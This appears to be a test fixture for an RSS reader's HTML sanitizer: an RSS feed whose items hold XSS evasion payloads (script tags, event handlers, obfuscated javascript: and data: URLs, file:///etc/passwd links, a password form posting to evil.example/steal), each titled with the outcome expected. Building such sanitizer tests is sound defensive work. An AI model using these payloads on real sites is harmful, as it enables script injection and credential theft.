@@ -1,0 +1,185 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Hostile corpus for the sanitizer. Every item body is an attack that has been seen in the wild or
+  is listed in the OWASP XSS filter evasion sheet. The expectation for each is written in its title.
+
+  Run with:  freshrss-rs parse fixtures/feeds/hostile/body.xml --show-content
+-->
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Hostile content corpus</title>
+    <link>https://example.com</link>
+    <description>Bodies that must all come back inert.</description>
+
+    <item>
+      <title>Script element and body are both removed</title>
+      <guid isPermaLink="false">h01</guid>
+      <content:encoded><![CDATA[
+        <p>before</p>
+        <script>alert('xss')</script>
+        <script src="https://evil.example/x.js"></script>
+        <p>after</p>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Every event-handler attribute is removed</title>
+      <guid isPermaLink="false">h02</guid>
+      <content:encoded><![CDATA[
+        <img src="https://example.com/a.png" onerror="alert(1)">
+        <p onclick="alert(2)">click</p>
+        <body onload="alert(3)">
+        <div onmouseover="alert(4)">hover</div>
+        <a href="https://example.com" onfocus="alert(5)">focus</a>
+        <svg onload="alert(6)"><circle r="9"/></svg>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>javascript: URLs in every URL-bearing attribute</title>
+      <guid isPermaLink="false">h03</guid>
+      <content:encoded><![CDATA[
+        <a href="javascript:alert(1)">plain</a>
+        <a href="JaVaScRiPt:alert(2)">mixed case</a>
+        <a href="  javascript:alert(3)">leading spaces</a>
+        <a href="java&#9;script:alert(4)">embedded tab entity</a>
+        <a href="&#106;avascript:alert(5)">encoded first letter</a>
+        <a href="&#x6a;avascript:alert(6)">hex encoded</a>
+        <img src="javascript:alert(7)">
+        <iframe src="javascript:alert(8)"></iframe>
+        <blockquote cite="javascript:alert(9)">q</blockquote>
+        <video poster="javascript:alert(10)"></video>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Other dangerous schemes</title>
+      <guid isPermaLink="false">h04</guid>
+      <content:encoded><![CDATA[
+        <a href="vbscript:msgbox(1)">vbscript</a>
+        <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data html</a>
+        <a href="file:///etc/passwd">file</a>
+        <img src="file:///etc/shadow">
+        <iframe src="blob:https://example.com/uuid"></iframe>
+        <a href="moz-extension://abc/x.html">extension</a>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>data: survives only as a non-SVG image source</title>
+      <guid isPermaLink="false">h05</guid>
+      <content:encoded><![CDATA[
+        <img src="data:image/png;base64,iVBORw0KGgo=">
+        <img src="data:image/gif;base64,R0lGODlh">
+        <img src="data:image/svg+xml,<svg onload=alert(1)>">
+        <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+        <a href="data:image/png;base64,iVBORw0KGgo=">not an img</a>
+        <iframe src="data:image/png;base64,iVBORw0KGgo="></iframe>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Plugin and framing elements are removed</title>
+      <guid isPermaLink="false">h06</guid>
+      <content:encoded><![CDATA[
+        <object data="https://evil.example/x.swf"><param name="movie" value="x.swf"></object>
+        <embed src="https://evil.example/x.swf">
+        <applet code="Evil.class"></applet>
+        <form action="https://evil.example/steal"><input name="pw" type="password"></form>
+        <base href="https://evil.example/">
+        <meta http-equiv="refresh" content="0;url=https://evil.example">
+        <link rel="stylesheet" href="https://evil.example/x.css">
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>An allowed iframe is sandboxed</title>
+      <guid isPermaLink="false">h07</guid>
+      <content:encoded><![CDATA[
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allow="everything" sandbox=""></iframe>
+        <iframe srcdoc="<script>alert(1)</script>"></iframe>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Style attributes and stylesheets are removed</title>
+      <guid isPermaLink="false">h08</guid>
+      <content:encoded><![CDATA[
+        <p style="background:url('javascript:alert(1)')">styled</p>
+        <div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>
+        <style>body { display: none }</style>
+        <p style="behavior:url(#default#time2)">ie</p>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>id and class cannot target the reader's own CSS or DOM</title>
+      <guid isPermaLink="false">h09</guid>
+      <content:encoded><![CDATA[
+        <p id="rd-nav" class="rd-item is-unread rd-app">spoofed</p>
+        <a href="#rd-list-scroll">jump to the reader's list</a>
+        <div id="icerik">content</div>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Relative URLs resolve against the feed, not the reader</title>
+      <guid isPermaLink="false">h10</guid>
+      <content:encoded><![CDATA[
+        <img src="/logo.png">
+        <img src="../up.png">
+        <img src="img/rel.png">
+        <a href="/admin">root relative</a>
+        <a href="//cdn.example.com/x.png">protocol relative</a>
+        <a href="#in-article">fragment stays relative</a>
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Comments cannot smuggle conditional markup</title>
+      <guid isPermaLink="false">h11</guid>
+      <content:encoded><![CDATA[
+        <!-- a plain comment -->
+        <!--[if IE]><script>alert('ie')</script><![endif]-->
+        <!--><script>alert('nested')</script>-->
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Markup that is not closed is balanced, not truncated</title>
+      <guid isPermaLink="false">h12</guid>
+      <content:encoded><![CDATA[
+        <p>unclosed paragraph
+        <b>unclosed bold
+        <div><span>deeply unclosed
+      ]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Deeply nested tags must not overflow the stack</title>
+      <guid isPermaLink="false">h13</guid>
+      <content:encoded><![CDATA[<b><i><u><b><i><u><b><i><u><b><i>ten levels</i></b></u></i></b></u></i></b></u></i></b>]]></content:encoded>
+    </item>
+
+    <item>
+      <title>Escaped markup in the source stays text</title>
+      <guid isPermaLink="false">h14</guid>
+      <description>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; and &lt;script&gt;alert(2)&lt;/script&gt;</description>
+    </item>
+
+    <item>
+      <title>Legitimate markup and MathML must survive untouched</title>
+      <guid isPermaLink="false">h15</guid>
+      <content:encoded><![CDATA[
+        <p>A paragraph with <b>bold</b>, <i>italic</i>, <a href="https://example.com/ok">a link</a>,
+        <code>code</code> and a list:</p>
+        <ul><li>one</li><li>two</li></ul>
+        <table><tr><td>cell</td></tr></table>
+        <figure><img src="https://example.com/a.png" alt="An image" width="10" height="10">
+          <figcaption>A caption</figcaption></figure>
+        <math display="block"><mfrac><mn>1</mn><mn>2</mn></mfrac></math>
+        <audio src="https://example.com/a.mp3"></audio>
+      ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
